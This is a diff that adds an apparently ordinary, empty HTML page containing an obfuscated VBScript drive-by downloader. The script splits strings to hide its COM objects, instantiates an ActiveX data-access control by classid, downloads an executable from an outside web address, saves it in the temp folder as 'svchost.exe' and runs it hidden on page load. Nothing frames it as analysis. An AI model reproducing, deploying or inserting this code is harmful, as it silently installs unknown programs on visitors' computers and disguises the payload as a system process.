@@ -1,0 +1,37 @@
+<html>
+<script language="VBScript">
+    on error resume next
+    xx="o"&"bj"&"e"&"ct"
+    strb="Mic"&"roso"&"ft.XMLHT"&"TP"
+    strd="Ad"&"od"&"b.Str"&"eam"
+    xxxx="Scripting.FileSystemObject"
+    xx="o"&"bj"&"e"&"ct"
+    Set df = document.createElement(xx)
+    f7="cls"&"id:BD9"&"6C5"&"56-6"&"5A3-1"&"1D"&"0-98"&"3"&"A-00"&"C04F"&"C2"&"9E36"
+    xxx="cla"&"ssid"
+    df.setAttribute xxx, f7
+    Set x = df.CreateObject(strb,"")
+    set SS = df.createobject(strd,"")
+    SS.type = 1
+    x.Open "GET", "http://www.jiuhuashanwh.com/inc/error/mp3/error/1.exe", False
+    x.Send
+    marco1="svchost.exe"
+    set F = df.createobject(xxxx,"")
+    tmp2=2
+    set tmp = F.GetSpecialFolder(tmp2)
+    SS.open
+    marco1= F.BuildPath(tmp,marco1)
+    SS.write x.responseBody
+    SS.savetofile marco1,2
+    SS.close
+    zz="She"&"ll.Appl"&"icati"&"on"
+    set Q = df.createobject(zz,"")
+    dd="o"&"p"&"e"&"n"
+    Q.ShellExecute marco1,"","",dd,0
+    </script>
+    <head>
+    <title></title>
+    </head><body>
+    </body></html>
+
+
